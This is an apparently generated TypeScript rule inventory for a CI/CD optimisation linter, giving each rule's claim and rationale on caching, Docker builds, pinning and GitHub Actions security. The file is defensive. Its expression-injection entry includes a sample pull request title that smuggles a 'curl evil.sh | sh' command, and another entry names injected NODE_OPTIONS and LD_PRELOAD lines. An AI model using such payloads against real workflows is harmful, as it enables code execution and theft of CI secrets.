// GENERATED: npm run assurance:generate; explicit entries are checked against the complete built-in registry.
export const RULE_ASSURANCE = {
  "schema": "cicd-optimizer/rule-assurance-v1",
  "interpretation": "This exhaustive claim inventory is not a proof of detector correctness or recommendation benefits. Only the separately scoped engine/model contracts are machine-proved.",
  "engineContract": {
    "id": "severity-last-assignment-wins",
    "theorem": "Policy.Resolve",
    "implementation": "src/lint/config.ts -> src/formal/policy.ts -> generated Policy.Resolve",
    "guarantee": "The last present assignment wins (matching preset defaults, then ruleset override, then explicit rule override); no assignment means off.",
    "exclusions": [
      "YAML parsing",
      "preset membership extraction",
      "option merging",
      "capability/suppression handling",
      "detector correctness",
      "autofix semantics",
      "pipeline performance"
    ]
  },
  "rules": [
    {
      "id": "affected/change-detection",
      "metadataSha256": "19b42a050eeee4dac978a01deb8785607fc0be150bf1bbf05b97eb9a9f64c913",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Multi-job pull request workflows in a monorepo should skip jobs whose area did not change."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "In a monorepo most pull requests touch one area, yet every job still provisions a runner, restores caches, and installs dependencies. A small change-detection job that feeds job-level `if:` conditions skips the unrelated jobs entirely. Agent-driven repositories open many narrow pull requests, so the savings compound, and an always-run gate job keeps branch protection simple because skipped jobs report success."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "affected/path-filter-required-checks",
      "metadataSha256": "c0191a7d7c57127677d35f8b835f2b6dc783634f57b0475409096e6728ed6057",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Pull request workflows should not skip themselves with trigger-level `paths` filters if they provide required checks."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When `paths`/`paths-ignore` skips a pull request workflow, its checks never report and stay Pending, so a pull request that requires them cannot merge. Agents then stall or someone adds a bypass. Running the workflow on every pull request and skipping work with job-level `if:` conditions keeps the speed benefit: skipped jobs report success, and an always-run gate job gives branch protection one stable check."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "affected/test-selection",
      "metadataSha256": "0aa3bea5c4f9c5ece15966efed7910e0dcd1c47f63c03a8c4c602b8a7747674a",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Pull request CI in a monorepo should test only the projects affected by the change."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Running every project's tests on every pull request makes CI time grow with the size of the repository instead of the size of the change. Agents open many small pull requests, so affected-only selection (nx affected, turbo --affected, pnpm `[ref]` filters, lerna --since) is the biggest lever for keeping feedback fast and runner minutes bounded."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "affected/trusted-change-detection",
      "metadataSha256": "837638e02420d28d6e3ce4df9e1e98840ea2d0e705a52018f7cef86747003bfe",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Change-detection steps must not use tj-actions/changed-files versions affected by CVE-2025-30066."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Change detection runs on every pull request, often with secrets in scope. In March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit that dumped runner memory, including secrets, into workflow logs (CVE-2025-30066). Versions before v46.0.1 are in the advisory's affected range; agents copying an old snippet reintroduce it."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "caching/build-tool-cache",
      "metadataSha256": "5c8f0bf933197907204b9d2eacbfeb31a4f5e6ed94ea24e5857e0fe683b07604",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "caching/cache-key",
      "metadataSha256": "c858450436d660bc6aef0b3a9701e8cd1e6bd670cbafbc5124d8969c6d0346cb",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "actions/cache keys must invalidate when inputs change and still hit between runs."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": [
        "cache-primary-key-partition-relative-to-declared-D"
      ]
    },
    {
      "id": "caching/docker-layer-cache",
      "metadataSha256": "9390298b6f82374e5fed63be4214c779101c32d8615d09651649aa0ca509219a",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Docker image builds in CI should import and export a layer cache."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "caching/setup-cache",
      "metadataSha256": "eae82b9409bb1a8744fe8989a0ab37b20936103e4fbdd52038b0bf718c7b8ddd",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Language setup actions should cache downloaded dependencies."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "checkout/affected-base-ref",
      "metadataSha256": "be35d05e489005939ae7d98651fabb69b805a591b9672382d4a556fc96034b59",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Affected/changed-only commands need the base commit, which a default shallow checkout does not fetch."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`actions/checkout` fetches a single commit by default. Affected-only tooling (nx affected, turbo --affected, pnpm/turbo `[ref]` filters, jest --changedSince, git diff against the base) then either fails with an unknown revision or silently falls back to running everything, which defeats the selection that makes agent-scale CI affordable."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "checkout/partial-clone",
      "metadataSha256": "fa2e53db222b503e755ac42b5458445e4e6656236eab845b22d9f9e31dec8df3",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Full-history checkouts (`fetch-depth: 0`) should use a blobless partial clone (`filter: blob:none`)."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`fetch-depth: 0` downloads every version of every file ever committed, which dominates checkout time in large or long-lived repositories. A blobless partial clone keeps the full commit graph that history-aware tools (affected detection, changelogs, versioning) need, and fetches file contents lazily only when a command reads them. Agent-driven repositories run many more jobs, so the saving compounds."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "checkout/sparse-checkout",
      "metadataSha256": "50471dd5a25efc228a4bc2dbbea70abb16390ee6d19daa5767da9ccd2422e899",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs that only work inside one workspace package of a large monorepo can use a sparse checkout."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "In large monorepos most of the checkout is files a package-scoped job never reads. A cone-mode sparse checkout of the package, its workspace dependencies, and shared config keeps checkout and disk usage proportional to the job, which adds up when agents trigger many small package-level runs."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/apt-hygiene",
      "metadataSha256": "426a78815455c501e7f4957429951f57b27ff6bdbbdfc61f8d203ba6a6d27e1f",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "apt and apk installs in Dockerfiles should skip recommended packages, update and install in one layer, and not leave package caches in the image."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Recommended packages and leftover package indexes add tens of megabytes to every layer that is pushed, pulled, and cached. `apt-get update` in its own RUN creates a layer that BuildKit keeps reusing, so later installs run against a stale index (or fail). Smaller layers mean faster pulls on every ephemeral CI runner and agent sandbox."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/cache-mount",
      "metadataSha256": "72d8237288915f71631ab2471eec240453b05ff80fe483f85c059805d39bac59",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Dependency installs and compiles in Dockerfiles should use BuildKit cache mounts for package-manager and compiler caches."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When a dependency layer is invalidated, a cache mount (`RUN --mount=type=cache`) lets the package manager reuse previously downloaded packages and compiler output instead of fetching everything again, and keeps those caches out of the image. Cache mounts live in the builder, so on ephemeral hosted runners pair them with a persistent builder or export them (for example with buildkit-cache-dance) to benefit across CI runs."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/dependency-layer",
      "metadataSha256": "1093f72ba0516750bdb5c0b4078e49561f0c5c93b1b647ba2e749e3b9e50c7da",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Dockerfiles should install dependencies from manifests and lockfiles before copying the rest of the source tree."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "BuildKit reuses a layer only while every input above it is unchanged. Copying the whole context before the install means each source edit (every agent iteration) re-downloads and re-installs all dependencies; copying only manifests and lockfiles first keeps the dependency layer cached until dependencies actually change."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/dockerignore",
      "metadataSha256": "d545f039c138655dd826277142496a031c75fd89e590cf6810e8ff64ee36f9db",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Docker build contexts that are copied into images should have a .dockerignore excluding .git and node_modules."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Without a .dockerignore, `COPY . .` sends and hashes the whole context, including `.git`, `node_modules`, and local build output. Every commit, install, or agent scratch file then changes the COPY checksum and invalidates that layer and everything after it, and large contexts slow down every build."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/multi-stage",
      "metadataSha256": "e65ae2cf0a5faf9c4f88b57be1a7f8cd96c4f9726bb592a28e37699450264ffc",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Single-stage Dockerfiles that install build toolchains or dev dependencies should use a builder stage and a minimal runtime stage."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Compilers, git, and devDependencies are only needed to build. Shipping them makes every pull, push, and layer upload larger and slower (and widens the attack surface). A multi-stage build compiles in a builder stage and copies only artifacts into a slim or distroless runtime stage; BuildKit also builds independent stages in parallel."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "containers/shared-base",
      "metadataSha256": "ec7936d6bdf33aec8c15bb3864c0888634585ecff82ad6babb5970ea2cbc4555",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Dockerfiles that repeat the same base image and toolchain preamble should share a base image published to GHCR."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When several services start from the same image and install the same toolchain, every service build and every runner repeats that work and stores its own copy of the layer. Publishing the preamble once as a shared base image (referenced by digest) builds it once, lets every service and agent sandbox pull the identical cached layer, and turns toolchain upgrades into a single reviewed digest bump."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "hermeticity/docker-base-digest",
      "metadataSha256": "0315481c809df21356dd5fd7985c1b56c16e05d813979912cab7ed7247adf3a7",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Dockerfile base images should use pinned versions (and digests when required)."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "hermeticity/frozen-lockfile",
      "metadataSha256": "451f2dfa7fbbd12e9f2890b0f1c1550ada0ab78939587f1f80ea2a4dc95091a4",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "CI installs must be locked to the committed lockfile."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`npm install` and unfrozen yarn/bun installs can rewrite the lockfile and resolve different versions per run, which breaks reproducibility and cache keys. Frozen installs are also faster."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "hermeticity/pin-actions",
      "metadataSha256": "428a509988c70abef3b8ea941952d3929df6d906cae55412ee2e4a8a0a1c22ac",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Third-party actions and reusable workflows should be pinned to a full commit SHA."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Tags and branches can be moved, so `@v4` may run different code tomorrow than today, which breaks reproducibility and is a supply-chain risk. A full-length commit SHA is immutable. (OpenSSF Scorecard also treats a tag backed by an immutable release as pinned, but most action tags are not immutable releases and this cannot be verified offline.)"
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "hermeticity/pin-container-images",
      "metadataSha256": "7bdfd2926d9ba7576d59dfcabc48635266a4abe0469488939706dce8397b5c18",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Job containers and service containers should use pinned image versions."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "hermeticity/pin-runner",
      "metadataSha256": "301a5280a0bc9f51e80b04e455097e8f828c3f83618c486e47f42c62f1e2f013",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs should run on a pinned runner image label instead of `*-latest`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`ubuntu-latest`, `windows-latest` and `macos-latest` move to a new OS image during a gradual multi-week rollout, so identical commits can pass on one run and fail on the next with different toolchains and preinstalled software. `ubuntu-latest` is migrating from Ubuntu 24.04 to 26.04 between Oct 19 and Nov 19, 2026. Pinning makes the upgrade a deliberate, reviewable change."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "packages/exports-map",
      "metadataSha256": "392704693101f548c834ae8073c8b349720db905e0303b188f9c1af01264a9f5",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Library packages should declare an `exports` map, and ESM libraries a `sideEffects` field."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "An `exports` map is the package's public API: it blocks deep imports into internals, so packages can be split, moved, and rebuilt independently without breaking consumers, and it lets bundlers and TypeScript resolve the right entry without probing. `sideEffects` tells bundlers which modules are safe to drop, which keeps tree-shaking effective and app bundles (and their build times) small."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "packages/files-allowlist",
      "metadataSha256": "0c1416338e68d26bf6381dae5f86ab93c530e2e17b43081fd7b0ad62484ff851",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Publishable packages should declare a `files` allowlist (or an `.npmignore`) so the tarball only ships build output."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Without an allowlist `npm publish` packs the whole package directory: sources, tests, fixtures, configs, and stray build caches. Bloated tarballs make every install, CI cache restore, and container layer that contains node_modules larger and slower, and can leak files that were never meant to be published. A `files` allowlist keeps composable packages small."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "packages/monolith",
      "metadataSha256": "7332bc783994d6ef89830b825d56b2c1b289cead33d707818f40a44cde4aad7e",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Packages with very many dependencies are candidates for decomposition into smaller composable packages."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A package that pulls in everything is one cache key: any change to it, or to any of its dependencies, reinstalls, rebuilds, and retests the whole thing, and every image that contains it ships all of it. Smaller packages with explicit boundaries let affected-only CI, remote caches, and OCI layers reuse work, which is what keeps agentic edit-test loops fast."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "packages/version-drift",
      "metadataSha256": "496692f7adfa8b1b9dda706833930514b6eb72b24aaa97b1bbbf21855b6a79d4",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Workspace packages should declare each third-party dependency with the same version specifier."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When packages in one monorepo ask for different ranges of the same dependency, the lockfile carries several copies, installs and node_modules grow, Docker dependency layers and CI caches fragment by package, and packages behave differently at runtime and in tests. A single version policy keeps one hermetic dependency set that every package and image layer can share."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/duplicate-command",
      "metadataSha256": "dc3ba5f50a2f9a323b27b92c7cbf6a20aa8b8f3aef8c6461235a122a8ed0d704",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "A job should not run the same non-trivial shell command more than once."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/duplicate-setup-step",
      "metadataSha256": "d74d84ae33cc94943556d1ae08680d0d30906b55d1091a76e7a50df07ccd35c7",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "A job should not run the same toolchain setup action twice with the same inputs."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/rebuild-per-job",
      "metadataSha256": "067374fbe410f03afba66ddb3fea6c646a627e7d6785d5ce269b10ce80a9f781",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Several jobs in a workflow should not each rebuild the same project from scratch."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/repeated-job-setup",
      "metadataSha256": "2259417589446a00fe065d21a5f1c95c2dc4acd857b1feccdda317f78c550c46",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs that repeat the same leading setup steps could share a composite action."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/shadowed-env",
      "metadataSha256": "268e28d3d31ecc68960e2488a4d4cd13c70d0b3bccbfb07dad035f0f78911395",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "A job or step should not redefine an environment variable to the value it already inherits."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "redundancy/toolchain-version-drift",
      "metadataSha256": "8df1ec7208b6386248e08af78fdb9499232d1ae773812ed60de8cdb11b76673d",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Workflows should agree on the toolchain version they install with each setup action."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "registries/ghcr",
      "metadataSha256": "5901f90f413668cae55a87e08be4a782b93dc043d623645a61514c623a1e506c",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Container images built in CI should be published to GitHub Container Registry (ghcr.io)."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Publishing to GHCR keeps images next to the code: the workflow's GITHUB_TOKEN can push without long-lived registry secrets, packages inherit organization permissions and link to the repository, and runners pull from GHCR without Docker Hub's anonymous rate limits. Shared base and dependency layers published once to GHCR can then be reused by every service in the monorepo."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "registries/github-npm",
      "metadataSha256": "7b9be7867143022f2e769d773657c6710ee21d7b1e2fb7f4004add514a0e9916",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Internal scoped npm packages should be published to the GitHub npm registry (npm.pkg.github.com)."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Publishing internal packages to GitHub Packages keeps them next to their source: Actions publish and install with the workflow's GITHUB_TOKEN instead of long-lived npm tokens, access follows organization and repository permissions, and small composable packages can be versioned and consumed independently by every repository and container build in the organization."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/env-file-injection",
      "metadataSha256": "899ea267e40bd9afadc98de79bfe72261ba22e6a42d5bf4694d13ac9040f81eb",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/excessive-permissions",
      "metadataSha256": "2563bfbcd427a65da7f0207da75e4a29b9eada31e37268be30e6fa45698103b1",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/expression-injection",
      "metadataSha256": "912defcadafb7c56aba301fd8e6a613572d189cfbd805481f4ceabe9338ff71a",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a\"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/install-scripts-privileged",
      "metadataSha256": "c802f79226514eb8e921b1c2ccbd3ba491cf078b5959418584d304dd6f3a6117",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/mutable-remote-ref",
      "metadataSha256": "92e1964aefc8155f2af3545c3f3aee55979375504bf8725dcfb1c3f24f8ca9fa",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/persisted-credentials",
      "metadataSha256": "83edf545a7499aff3f2d2e1b194d49c6e57ae963a1d3f3fae2d73e4b2b008355",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "`actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/privileged-cache-restore",
      "metadataSha256": "896a51a24efea253bfbcb27bf90530b3d04372fcd50d86ac1989c24469180b49",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
